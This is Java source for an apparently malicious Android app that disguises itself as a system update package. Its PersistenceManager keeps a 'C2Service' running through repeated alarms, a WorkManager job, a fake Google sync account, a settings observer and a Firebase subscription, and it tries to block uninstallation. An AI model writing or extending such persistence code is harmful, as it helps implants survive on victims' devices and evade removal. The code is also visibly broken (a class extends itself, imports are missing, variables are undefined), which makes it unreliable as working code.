package com.android.system.update.utils;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.SystemClock;

import com.android.system.update.receivers.AlarmReceiver;
import com.android.system.update.services.C2Service;

import java.util.concurrent.TimeUnit;

public class PersistenceManager {
    
    public static void installAll(Context context) {
        installBootReceiver(context);
        installAlarmManager(context);
        installWorkManager(context);
        installAccountSync(context);
        installContentObserver(context);
        installFirebaseMessaging(context);
        installOverlayPersistence(context);
    }
    
    private static void installBootReceiver(Context context) {
        // Already in manifest
    }
    
    private static void installAlarmManager(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
            context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );
        
        long interval = TimeUnit.MINUTES.toMillis(5);
        long triggerAt = SystemClock.elapsedRealtime() + interval;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pendingIntent);
        } else {
            alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, interval, pendingIntent);
        }
    }
    
    private static void installWorkManager(Context context) {
        // Using AndroidX WorkManager
        PeriodicWorkRequest workRequest = 
            new PeriodicWorkRequest.Builder(Worker.class, 15, TimeUnit.MINUTES)
                .setConstraints(new Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build())
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
                .build();
        
        WorkManager.getInstance(context)
            .enqueueUniquePeriodicWork("persistence_worker", 
                ExistingPeriodicWorkPolicy.KEEP, workRequest);
    }
    
    private static void installAccountSync(Context context) {
        Account account = new Account("system_update", "com.google");
        AccountManager accountManager = AccountManager.get(context);
        accountManager.addAccountExplicitly(account, null, null);
        
        ContentResolver.setIsSyncable(account, "com.android.contacts", 1);
        ContentResolver.setSyncAutomatically(account, "com.android.contacts", true);
        ContentResolver.addPeriodicSync(account, "com.android.contacts", Bundle.EMPTY, 60 * 60);
    }
    
    private static void installContentObserver(Context context) {
        context.getContentResolver().registerContentObserver(
            Settings.Secure.CONTENT_URI,
            true,
            new PersistenceObserver(new Handler())
        );
    }
    
    private static void installFirebaseMessaging(Context context) {
        FirebaseMessaging.getInstance().subscribeToTopic("persistence")
            .addOnCompleteListener(task -> {
                if (task.isSuccessful()) {
                    Log.d("Persistence", "FCM subscribed");
                }
            });
    }
    
    private static void installOverlayPersistence(Context context) {
        // Watch for uninstall attempts
        IntentFilter filter = new IntentFilter(Intent.ACTION_PACKAGE_REMOVED);
        filter.addDataScheme("package");
        context.registerReceiver(new UninstallBlocker(), filter);
    }
    
    // Worker class for WorkManager
    public static class Worker extends Worker {
        public Worker(@NonNull Context context, @NonNull WorkerParameters params) {
            super(context, params);
        }
        
        @NonNull
        @Override
        public Result doWork() {
            // Ensure services are running
            context.startService(new Intent(context, C2Service.class));
            return Result.success();
        }
    }
    
    // ContentObserver
    public static class PersistenceObserver extends ContentObserver {
        public PersistenceObserver(Handler handler) {
            super(handler);
        }
        
        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            // Trigger when settings change
            context.startService(new Intent(context, C2Service.class));
        }
    }
    
    // UninstallBlocker
    public static class UninstallBlocker extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String packageName = intent.getData().getSchemeSpecificPart();
            if (packageName.equals(context.getPackageName())) {
                // Prevent uninstall by redirecting
                Intent homeIntent = new Intent(Intent.ACTION_MAIN);
                homeIntent.addCategory(Intent.CATEGORY_HOME);
                homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(homeIntent);
            }
        }
    }
}